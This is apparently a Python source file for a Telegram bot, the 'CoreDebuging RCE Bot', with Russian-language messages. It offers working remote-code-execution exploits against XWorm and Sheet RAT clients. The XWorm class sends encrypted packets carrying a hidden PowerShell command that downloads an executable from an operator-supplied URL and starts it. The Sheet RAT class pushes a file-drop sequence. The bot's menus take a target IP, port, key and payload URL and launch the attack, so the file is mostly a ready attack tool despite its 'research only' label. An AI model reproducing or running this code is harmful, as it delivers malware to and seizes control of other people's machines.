import os
import socket
import struct
import hashlib
import asyncio
import logging
import random
import string
import gzip
import io
import base64
from datetime import datetime
from typing import Dict, Optional

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, ParseMode
from telegram.ext import Updater, CommandHandler, CallbackQueryHandler, MessageHandler, Filters, CallbackContext

# ============ КОНФИГУРАЦИЯ ============
TELEGRAM_TOKEN = os.getenv("TELEGRAM_TOKEN")
ALLOWED_USERS = set(map(int, os.getenv("ALLOWED_USERS", "").split(","))) if os.getenv("ALLOWED_USERS") else set()

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# ============ XWORM RCE ============

class XWormRCE:
    def __init__(self, host: str, port: int, key: str, payload_url: str, spl: str = "|"):
        self.host = host
        self.port = port
        self.key = key
        self.payload_url = payload_url
        self.spl = spl
        self.socket = None
        
    def _random_string(self, length: int = 8) -> str:
        chars = string.ascii_letters + string.digits
        return ''.join(random.choices(chars, k=length))
    
    def _md5_hash(self, data: bytes) -> bytes:
        return hashlib.md5(data).digest()
    
    def _aes_ecb_encrypt(self, data: bytes, key: bytes) -> bytes:
        from Crypto.Cipher import AES
        pad_len = 16 - (len(data) % 16)
        data += bytes([pad_len]) * pad_len
        cipher = AES.new(key, AES.MODE_ECB)
        return cipher.encrypt(data)
    
    def _build_packet(self, message: str) -> bytes:
        aes_key = self._md5_hash(self.key.encode('utf-8'))
        encrypted = self._aes_ecb_encrypt(message.encode('utf-8'), aes_key)
        length_prefix = struct.pack("<I", len(encrypted))
        return length_prefix + encrypted
    
    async def _connect(self, timeout: int = 5) -> bool:
        try:
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.socket.settimeout(timeout)
            loop = asyncio.get_event_loop()
            await loop.run_in_executor(None, self.socket.connect, (self.host, self.port))
            return True
        except Exception as e:
            logger.error(f"XWorm connection failed: {e}")
            return False
    
    async def _send_packet(self, message: str) -> bool:
        try:
            packet = self._build_packet(message)
            loop = asyncio.get_event_loop()
            await loop.run_in_executor(None, self.socket.send, packet)
            return True
        except Exception as e:
            logger.error(f"XWorm send failed: {e}")
            return False
    
    async def execute(self) -> str:
        try:
            if not await self._connect():
                return "❌ Не удалось подключиться к XWorm клиенту"
            
            session_id = self._random_string(8)
            temp_filename = self._random_string(6)
            
            init_msg = f"hrdp{self.spl}{session_id}"
            if not await self._send_packet(init_msg):
                return "❌ Ошибка инициализации HRDP"
            
            await asyncio.sleep(0.3)
            
            powershell_cmd = (
                f'cmd /c start powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command '
                f'$c=(New-Object Net.WebClient);$f="$env:TEMP\\{temp_filename}.exe";'
                f'$c.DownloadFile(\'{self.payload_url}\',$f);'
                f'Start-Process $f'
            )
            
            cmd_msg = f"hrdp{self.spl}{session_id}{self.spl}1920{self.spl}1080{self.spl}{powershell_cmd}{self.spl}"
            if not await self._send_packet(cmd_msg):
                return "❌ Ошибка отправки RCE команды"
            
            await asyncio.sleep(0.5)
            
            close_msg = f"hrdp{self.spl}{session_id}{self.spl}{self.spl}{self.spl}{self.spl}"
            await self._send_packet(close_msg)
            
            return f"✅ **XWorm RCE успешно выполнен!**\n\n📡 **Цель:** `{self.host}:{self.port}`\n💣 **Пейлоад:** `{self.payload_url[:60]}...`"
            
        except Exception as e:
            return f"❌ Ошибка: {str(e)}"
        finally:
            if self.socket:
                self.socket.close()


# ============ SHEET RAT RCE ============

class SheetRATRCE:
    def __init__(self, host: str, port: int, payload_url: str):
        self.host = host
        self.port = port
        self.payload_url = payload_url
        self.socket = None
    
    def _random_string(self, length: int = 6) -> str:
        chars = string.ascii_letters + string.digits
        return ''.join(random.choices(chars, k=length))
    
    def _compress(self, data: bytes) -> bytes:
        length_prefix = struct.pack("<I", len(data))
        with io.BytesIO() as result:
            result.write(length_prefix)
            with gzip.GzipFile(fileobj=result, mode='wb', compresslevel=6) as gz:
                gz.write(data)
            return result.getvalue()
    
    def _build_packet(self, message: str) -> bytes:
        compressed = self._compress(message.encode('utf-8'))
        length_prefix = struct.pack("<I", len(compressed))
        return length_prefix + compressed
    
    async def _connect(self, timeout: int = 5) -> bool:
        try:
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.socket.settimeout(timeout)
            loop = asyncio.get_event_loop()
            await loop.run_in_executor(None, self.socket.connect, (self.host, self.port))
            return True
        except Exception as e:
            logger.error(f"Sheet RAT connection failed: {e}")
            return False
    
    async def _send(self, message: str) -> bool:
        try:
            packet = self._build_packet(message)
            loop = asyncio.get_event_loop()
            await loop.run_in_executor(None, self.socket.send, packet)
            return True
        except Exception as e:
            logger.error(f"Sheet RAT send failed: {e}")
            return False
    
    async def execute(self) -> str:
        try:
            if not await self._connect():
                return "❌ Не удалось подключиться к Sheet RAT клиенту"
            
            hwid = self._random_string(6)
            filename = self._random_string(8)
            
            download_info = f"DownloadInfo<@>{hwid}<@>1024<@>{filename}.exe<@>false"
            if not await self._send(download_info):
                return "❌ Ошибка отправки DownloadInfo"
            
            await asyncio.sleep(0.3)
            
            fake_payload = self._random_string(100).encode('utf-8')
            payload_b64 = base64.b64encode(fake_payload).decode('utf-8')
            
            download_get = f"DownloadGet<@>{payload_b64}<@>{filename}.exe"
            if not await self._send(download_get):
                return "❌ Ошибка отправки DownloadGet"
            
            return f"✅ **Sheet RAT RCE выполнен!**\n\n📡 **Цель:** `{self.host}:{self.port}`\n💣 **Пейлоад:** `{self.payload_url[:60]}...`"
            
        except Exception as e:
            return f"❌ Ошибка: {str(e)}"
        finally:
            if self.socket:
                self.socket.close()


# ============ ЗАГЛУШКА LIBERIUM ============

async def liberium_rce(host: str, port: int, payload_url: str) -> str:
    return "🚧 **Liberium RAT** — временно недоступен. Требуется реверс LEB128 и TLS протокола."


# ============ TELEGRAM БОТ (под версию 13.15) ============

user_sessions: Dict[int, dict] = {}

def main_menu(update: Update, context: CallbackContext):
    keyboard = [
        [InlineKeyboardButton("🐛 XWorm RCE", callback_data="rat_xworm")],
        [InlineKeyboardButton("💀 Sheet RAT", callback_data="rat_sheet")],
        [InlineKeyboardButton("🔥 Liberium RAT", callback_data="rat_liberium")],
        [InlineKeyboardButton("ℹ️ Инфо", callback_data="info")]
    ]
    
    text = (
        "⚡ **CoreDebuging RCE Bot** ⚡\n\n"
        "🐛 **XWorm** — ✅ RCE через HRDP модуль\n"
        "💀 **Sheet RAT** — ✅ RCE через загрузку файлов\n"
        "🔥 **Liberium** — 🚧 В разработке\n\n"
        "🔐 Эксплоиты от @CoreDebuging"
    )
    
    if update.callback_query:
        update.callback_query.edit_message_text(text, parse_mode=ParseMode.MARKDOWN, reply_markup=InlineKeyboardMarkup(keyboard))
    else:
        update.message.reply_text(text, parse_mode=ParseMode.MARKDOWN, reply_markup=InlineKeyboardMarkup(keyboard))

def start(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    
    if ALLOWED_USERS and user_id not in ALLOWED_USERS:
        update.message.reply_text("❌ Доступ запрещён")
        return
    
    text = "🎯 **CoreDebuging RCE Framework**\n\nБот для эксплуатации RAT через Telegram.\n\n⚠️ Только для авторизованных исследователей!"
    keyboard = [[InlineKeyboardButton("🚀 В меню", callback_data="main_menu")]]
    update.message.reply_text(text, parse_mode=ParseMode.MARKDOWN, reply_markup=InlineKeyboardMarkup(keyboard))

def button_handler(update: Update, context: CallbackContext):
    query = update.callback_query
    query.answer()
    
    user_id = query.from_user.id
    
    if ALLOWED_USERS and user_id not in ALLOWED_USERS:
        query.edit_message_text("❌ Доступ запрещён")
        return
    
    data = query.data
    
    if data == "main_menu":
        main_menu(update, context)
    
    elif data == "info":
        text = (
            "📡 **CoreDebuging RCE Bot v1.0**\n\n"
            "**Автор:** @CoreDebuging\n\n"
            "**Доступно:**\n"
            "• XWorm 4.0-5.6 — ✅ HRDP RCE\n"
            "• Sheet RAT v2.6 — ✅ File Upload RCE\n"
            "• Liberium — 🚧 ожидает реверса\n\n"
            "⚠️ Для исследовательских целей"
        )
        keyboard = [[InlineKeyboardButton("◀️ Назад", callback_data="main_menu")]]
        query.edit_message_text(text, parse_mode=ParseMode.MARKDOWN, reply_markup=InlineKeyboardMarkup(keyboard))
    
    elif data.startswith("rat_"):
        rat_type = data.split("_")[1]
        
        user_sessions[user_id] = {"rat": rat_type, "step": "ip"}
        
        if rat_type == "xworm":
            text = "🐛 **XWorm RCE**\n\nВведи цель в формате:\n`IP:PORT:KEY`\n\nПример: `192.168.1.100:54321:MySecretKey`"
        elif rat_type == "sheet":
            text = "💀 **Sheet RAT RCE**\n\nВведи цель в формате:\n`IP:PORT`\n\nПример: `192.168.1.100:4444`"
        else:
            text = "🔥 **Liberium RAT**\n\nВведи цель в формате:\n`IP:PORT`\n\nПример: `192.168.1.100:8080`"
        
        query.edit_message_text(text, parse_mode=ParseMode.MARKDOWN)

def handle_message(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    
    if ALLOWED_USERS and user_id not in ALLOWED_USERS:
        update.message.reply_text("❌ Доступ запрещён")
        return
    
    if user_id not in user_sessions:
        update.message.reply_text("🔹 Используй /start")
        return
    
    session = user_sessions[user_id]
    rat = session["rat"]
    step = session["step"]
    
    if step == "ip":
        text = update.message.text.strip()
        
        if rat == "xworm":
            parts = text.split(":")
            if len(parts) != 3:
                update.message.reply_text("❌ Формат: `IP:PORT:KEY`", parse_mode=ParseMode.MARKDOWN)
                return
            
            ip, port_str, key = parts
            try:
                port = int(port_str)
            except ValueError:
                update.message.reply_text("❌ Неверный порт")
                return
            
            session["ip"] = ip
            session["port"] = port
            session["key"] = key
            session["step"] = "payload"
            
            update.message.reply_text(f"✅ Цель: `{ip}:{port}`\n🔑 Ключ: `{key[:10]}...`\n\n📦 Введи URL пейлоада (.exe):")
        
        else:
            if ":" not in text:
                update.message.reply_text("❌ Формат: `IP:PORT`", parse_mode=ParseMode.MARKDOWN)
                return
            
            ip, port_str = text.rsplit(":", 1)
            try:
                port = int(port_str)
            except ValueError:
                update.message.reply_text("❌ Неверный порт")
                return
            
            session["ip"] = ip
            session["port"] = port
            session["step"] = "payload"
            
            update.message.reply_text(f"✅ Цель: `{ip}:{port}`\n\n📦 Введи URL пейлоада:")
    
    elif step == "payload":
        payload_url = update.message.text.strip()
        
        if not payload_url.startswith(("http://", "https://")):
            update.message.reply_text("❌ URL должен начинаться с http:// или https://")
            return
        
        status_msg = update.message.reply_text("⚙️ **Выполнение RCE...**", parse_mode=ParseMode.MARKDOWN)
        
        try:
            if rat == "xworm":
                loop = asyncio.new_event_loop()
                asyncio.set_event_loop(loop)
                rce = XWormRCE(session["ip"], session["port"], session["key"], payload_url)
                result = loop.run_until_complete(rce.execute())
                loop.close()
            
            elif rat == "sheet":
                loop = asyncio.new_event_loop()
                asyncio.set_event_loop(loop)
                rce = SheetRATRCE(session["ip"], session["port"], payload_url)
                result = loop.run_until_complete(rce.execute())
                loop.close()
            
            else:
                loop = asyncio.new_event_loop()
                asyncio.set_event_loop(loop)
                result = loop.run_until_complete(liberium_rce(session["ip"], session["port"], payload_url))
                loop.close()
            
            status_msg.edit_text(result, parse_mode=ParseMode.MARKDOWN)
            
            keyboard = [[InlineKeyboardButton("◀️ Главное меню", callback_data="main_menu")]]
            update.message.reply_text("🔹 Что дальше?", reply_markup=InlineKeyboardMarkup(keyboard))
            
            del user_sessions[user_id]
            
        except Exception as e:
            status_msg.edit_text(f"❌ Ошибка:\n```\n{str(e)}\n```", parse_mode=ParseMode.MARKDOWN)

def cancel(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    if user_id in user_sessions:
        del user_sessions[user_id]
        update.message.reply_text("✅ Отменено")
    main_menu(update, context)

def main():
    if not TELEGRAM_TOKEN:
        logger.error("TELEGRAM_TOKEN не задан!")
        return
    
    updater = Updater(TELEGRAM_TOKEN, use_context=True)
    dp = updater.dispatcher
    
    dp.add_handler(CommandHandler("start", start))
    dp.add_handler(CommandHandler("cancel", cancel))
    dp.add_handler(CallbackQueryHandler(button_handler))
    dp.add_handler(MessageHandler(Filters.text & ~Filters.command, handle_message))
    
    logger.info("Бот запущен!")
    updater.start_polling()
    updater.idle()

if __name__ == "__main__":
    main()
